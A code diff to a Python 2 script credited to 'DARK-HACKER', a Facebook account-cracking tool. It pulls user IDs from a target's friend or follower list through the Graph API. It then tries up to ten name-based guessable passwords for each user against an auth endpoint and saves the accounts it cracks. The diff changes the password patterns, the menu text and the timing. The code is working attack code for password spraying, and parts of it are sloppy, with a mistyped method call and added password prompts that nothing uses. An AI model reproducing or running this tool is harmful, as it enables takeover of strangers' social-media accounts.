@@ -44,7 +44,7 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 
 banner="""
-\033[1;97m██████╗░░█████╗░██████╗░██        ██/033[1;0m
+\033[1;97m██████╗░░█████╗░██████╗░██    ██/033[1;0m
 \033[1;91m██╔══██╗██╔══██╗██╔══██╗██║░██/033[1;0m
 \033[1;97m██║░░██║███████║██████╔╝█████/033/033[1;0m
 \033[1;91m██║░░██║██╔══██║██╔══██╗██╔═██\033[1;0m
@@ -53,7 +53,7 @@ banner="""
 \033[1;97m--------------------------------------------------
 \033[1;93m(!)\033[1;97m Author   : DARK-HACKER
 \033[1;93m(!)\033[1;97m Github   : https://github.com/mrperfect0056
-\033[1;93m(!)\033[1;97m Fb Page  : https://m.facebook.com/darkhacker07
+\033[1;93m(!)\033[1;97m Facebook : https://m.facebook.com/darkhacker07
 \033[1;93m(!)\033[1;97m Api Key  : Dark-Hacker
 \033[1;97m--------------------------------------------------
 """
@@ -186,12 +186,12 @@ def menu():
     print banner
     print("\033[0;90m\tlogged user : " +name)
     print("")
-    print("\033[1;97m [1] Clone Friendlist And Public ID")
-    print("\033[1;97m [2] Clone With Auto Password")
+    print("\033[1;97m [1] Clone Follower And Public ID")
+    print("\033[1;97m [2] Clone With Manual Password")
     print("\033[1;97m [3] View Your Login Token")
     print("\033[1;97m [4] Update Tool")
     print("\033[1;97m [0] Main Menu Back")
-    print("\033[1;97m [00] Chek My github")
+    print("\033[1;97m [00] Don't Copy My script")
     print(50*"-")
     menu_select()
 def menu_select():
@@ -255,7 +255,7 @@ def crack_select():
 			print("[!] Target User : "+q["name"])
 		except KeyError:
 			print("")
-			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
+			print("\033[1;91mInvalid Link Or Friendlist Has Private").center(50)
 			print("")
 			time.sleep(3)
 			crack()
@@ -297,11 +297,11 @@ def crack_select():
 		time.sleep(3)
 		crack_select()
 	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
-	time.sleep(0.05)
+	time.sleep(0.03)
 	print("[!]\033[1;95m Cracking Start...")
-	time.sleep(0.05)
+	time.sleep(0.03)
 	print("[!]\033[1;95m Plz wait clone account will be appear here\033[1;0m")
-	time.sleep(0.05)
+	time.sleep(0.03)
 	print(50*"-")
 
 			
@@ -309,7 +309,7 @@ def crack_select():
 		user=arg
 		uid,name=user.split("|")
 		try:
-			pass1 = name+"1234"
+			pass1 = name+"12"
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
@@ -326,7 +326,7 @@ def crack_select():
 					cp.close()
 					cps.append(uid+pass1)
 				else:
-					pass2 = name+"12345"
+					pass2 = name+"123"
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
@@ -343,7 +343,7 @@ def crack_select():
 							cp.close()
 							cps.append(uid+pass2)
 						else:
-							pass3 = name+"123456"
+							pass3 = name+"1234"
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
@@ -360,7 +360,7 @@ def crack_select():
 									cp.close()
 									cps.append(uid+pass3)
 								else:
-									pass4 = name+"1122"
+									pass4 = name+"12345"
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
@@ -377,7 +377,7 @@ def crack_select():
 											cp.close()
 											cps.apppend(uid+pass4)
 										else:
-											pass5 = "123123"
+											pass5 = name+"102030"
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
@@ -394,7 +394,7 @@ def crack_select():
 													cp.close()
 													cps.append(uid+pass5)
 												else:
-													pass6 = "223344"
+													pass6 = name+"121"
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
@@ -411,7 +411,7 @@ def crack_select():
 															cp.close()
 															cps.append(uid+pass6)
 														else:
-															pass7 = "bangladesh"
+															pass7 = name+"1212"
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
@@ -428,7 +428,7 @@ def crack_select():
 																	cp.close()
 																	cps.append(uid+pass7)
 															        else:
-															                pass8 = "102030"
+															                pass8 = name+"112233"
 															                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
 															                q = json.loads(data)
 															                if "loc" in q:
@@ -445,7 +445,7 @@ def crack_select():
 																	                cp.close()
 																	                cps.append(uid+pass8)
 																	        else:
-															                                pass9 = "556677"
+															                                pass9 = name+"556677"
 															                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
 															                                q = json.loads(data)
 															                                if "loc" in q:
@@ -462,7 +462,7 @@ def crack_select():
 																	                                cp.close()
 																	                                cps.append(uid+pass9)
 																			        else:
-															                                                pass10 = "12345678"
+															                                                pass10 = name+"12345678"
 															                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
 															                                                q = json.loads(data)
 															                                                if "loc" in q:
@@ -522,6 +522,11 @@ def choice_select():
 		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
 		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
 		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+                Pass6 = raw_input("\033[1;97m[6] Enter password :\033[1;93m ")
+                Pass7 = raw_input("\033[1;97m[7] Enter password :\033[1;93m ")
+                Pass8 = raw_input("\033[1;97m[8] Enter password :\033[1;93m ")
+                Pass9 = raw_input("\033[1;97m[9] Enter password :\033[1;93m ")
+                Pass10 = raw_input("\033[1;97m[10] Enter password :\033[1;93m ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -551,6 +556,11 @@ def choice_select():
 		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
 		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
 		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+                Pass6 = raw_input("\033[1;97m[6] Enter password :\033[1;93m ")
+                Pass7 = raw_input("\033[1;97m[7] Enter password :\033[1;93m ")
+                Pass8 = raw_input("\033[1;97m[8] Enter password :\033[1;93m ")
+                Pass9 = raw_input("\033[1;97m[9] Enter password :\033[1;93m ")
+                Pass10 = raw_input("\033[1;97m[10] Enter password :\033[1;93m ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
